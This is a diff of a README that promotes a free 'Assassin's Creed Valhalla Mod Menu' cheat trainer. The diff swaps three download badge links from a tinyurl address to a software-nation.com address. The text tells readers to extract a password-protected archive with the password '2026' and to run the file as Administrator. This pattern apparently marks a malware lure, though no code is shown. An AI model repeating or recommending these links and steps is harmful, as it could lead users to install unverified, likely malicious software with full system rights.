@@ -9,7 +9,7 @@ The **🪓 Assassin's Creed Valhalla Mod Menu** is a **free** trainer for AC Val
 
 <div align="center">
 
-[![Download Assassin's Creed Valhalla Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/assassin-s-creed-valhalla)
+[![Download Assassin's Creed Valhalla Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/assassin-s-creed-valhalla)
 
 </div>
 
@@ -120,7 +120,7 @@ Assassin's Creed Valhalla is massive — 100+ hours of Viking action. Sometimes 
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Launch Valhalla → Activate cheats
 
-[![Download Assassin's Creed Valhalla Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/assassin-s-creed-valhalla)
+[![Download Assassin's Creed Valhalla Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/assassin-s-creed-valhalla)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -268,7 +268,7 @@ Rule England as a true Viking for free. **Assassin's Creed Valhalla Mod Menu** g
 
 <div align="center">
 
-[![Download Assassin's Creed Valhalla Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/assassin-s-creed-valhalla)
+[![Download Assassin's Creed Valhalla Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/assassin-s-creed-valhalla)
 
 **Version 4.6.1** — Free AC Valhalla trainer. April 2026 update. Zero cost. No payment.
 
